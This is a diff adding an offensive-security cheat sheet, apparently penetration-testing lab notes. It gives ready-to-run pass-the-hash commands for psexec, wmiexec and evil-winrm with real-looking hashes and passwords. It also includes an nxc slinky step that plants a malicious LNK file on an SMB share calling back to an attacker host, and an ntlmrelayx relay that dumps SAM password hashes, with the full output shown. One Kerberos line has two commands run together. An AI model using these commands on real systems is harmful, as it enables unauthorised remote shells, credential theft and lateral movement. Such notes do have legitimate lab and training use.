@@ -1,0 +1,200 @@
+## PSEXEC
+
+When you get pwned as SMB, you can get a shell instead of Winrm : 
+
+```jsx
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe
+```
+
+```jsx
+psexec.py administrator:YourPassword@10.10.10.63 cmd.exe
+```
+
+```jsx
+psexec -hashes 000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+```
+
+```jsx
+python3 psexec.py relia.com/administrator@172.16.173.7 -hashes aad3b435b51404eeaad3b435b51404ee:60446f9e333abfda8c548cbe11daedc2
+```
+
+Share folder with xfreerdp from linux attack machine : 
+
+```jsx
+xfreerdp /v:192.168.120.250 /u:Administrator /p:'123' /drive:share,/home/kali/share /cert:ignore
+```
+
+## WMIExec
+
+```bash
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
+```
+
+```bash
+wmiexec.py administrator:YourPassword@10.10.10.63
+```
+
+```bash
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 DOMAIN/administrator@10.10.10.63
+```
+
+Kerberos auth :
+
+```bash
+export KRB5CCNAME=administrator.ccachewmiexec.py -k -no-pass DOMAIN/administrator@dc01.domain.local
+```
+
+## Evil-Winrm :
+
+Password : 
+
+```jsx
+evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
+```
+
+With domain :
+
+```jsx
+evil-winrm -i 10.10.11.108 -u 'svc-printer@domain.local' -p '1edFg43012!!'
+```
+
+Pass the hash : 
+
+```jsx
+evil-winrm -i 10.10.11.108 -u svc-printer -H '<NTLM_HASH>'
+```
+
+Specifying SSL : 
+
+```jsx
+evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!' -S
+```
+
+Custom port : 
+
+```jsx
+evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!' -P 5986
+```
+
+## If you have write permission in a SMB folder with LNK :
+
+Use the nxc slinky module to upload README.lnk : 
+
+```jsx
+─(kali㉿kali)-[~/offsec/lab/10-laser/2]
+└─$ nxc smb 192.168.135.173 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M slinky -o SERVER=192.168.45.191 NAME=README
+/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
+  return True
+[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
+SMB         192.168.135.173 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:laser.com) (signing:True) (SMBv1:False) 
+SMB         192.168.135.173 445    MS01             [+] laser.com\Eric.Wallows:EricLikesRunning800 
+SMB         192.168.135.173 445    MS01             [*] Enumerated shares
+SMB         192.168.135.173 445    MS01             Share           Permissions     Remark
+SMB         192.168.135.173 445    MS01             -----           -----------     ------
+SMB         192.168.135.173 445    MS01             ADMIN$                          Remote Admin
+SMB         192.168.135.173 445    MS01             Apps            READ,WRITE      
+SMB         192.168.135.173 445    MS01             C$                              Default share
+SMB         192.168.135.173 445    MS01             IPC$            READ            Remote IPC
+SLINKY      192.168.135.173 445    MS01             [+] Found writable share: Apps
+SLINKY      192.168.135.173 445    MS01             [+] Created LNK file on the Apps share
+
+```
+
+Check : 
+
+```jsx
+┌──(.venv)─(kali㉿kali)-[~/tools/impacket/examples]
+└─$ python3 smbclient.py Eric.Wallows:EricLikesRunning800@192.168.135.173
+Impacket v0.14.0.dev0+20261019.123352.4f0348e8 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use Apps
+# ls
+drw-rw-rw-          0  Sat Nov 21 23:25:14 2026 .
+drw-rw-rw-          0  Sat Nov 21 23:25:14 2026 ..
+-rw-rw-rw-       1168  Wed Feb 12 13:17:16 2025 Event Viewer.lnk
+-rw-rw-rw-       1118  Wed Feb 12 13:17:16 2025 Print Management.lnk
+-rw-rw-rw-        113  Sat Nov 21 23:25:15 2026 README.lnk
+-rw-rw-rw-       1158  Wed Feb 12 13:17:16 2025 Services.lnk
+-rw-rw-rw-       1132  Wed Feb 12 13:17:16 2025 Task Scheduler.lnk
+-rw-rw-rw-          2  Sat Nov 21 23:13:10 2026 test.txt
+
+```
+
+Relay to another host (173 ⇒ 174): 
+
+```jsx
+┌──(.venv)─(kali㉿kali)-[~/tools/impacket/examples]
+└─$ python3 ntlmrelayx.py -t smb://192.168.135.174 --no-http-server -smb2support
+
+Impacket v0.14.0.dev0+20261019.123352.4f0348e8 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up MSSQL Server on port 1433
+[*] Setting up RDP Server on port 3389
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] Setting up RPC Server on port 135
+[*] (SMB): Received connection from 192.168.135.173, attacking target smb://192.168.135.174
+[*] (SMB): Authenticating connection from LASER/CARL.DEAN@192.168.135.173 against smb://192.168.135.174 SUCCEED [1]
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] smb://LASER/CARL.DEAN@192.168.135.174 [1] -> Service RemoteRegistry is in stopped state
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] smb://LASER/CARL.DEAN@192.168.135.174 [1] -> Starting service RemoteRegistry
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+[*] smb://LASER/CARL.DEAN@192.168.135.174 [1] -> Target system bootKey: 0x99439972b8f85f1d0e63f6603bc9585d
+[*] smb://LASER/CARL.DEAN@192.168.135.174 [1] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:15759746f66f2da88d58f0160f8ee676:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] All targets processed!
+[*] (SMB): Connection from 192.168.135.173 controlled, but there are no more targets left!
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1ebc870a303efa8d64fa1a840025ad84:::
+cloudbase-init:1000:aad3b435b51404eeaad3b435b51404ee:682040849a3a6eff43b43553d1a1f67c:::
+
+```
+
+Xfreerdp : 
+
+```jsx
+xfreerdp /u:user /p:pass /v:IP /dynamic-resolution /cert-ignore +clipboard
+```
+
+```jsx
+xfreerdp /u:user /p:pass /v:IP
+```
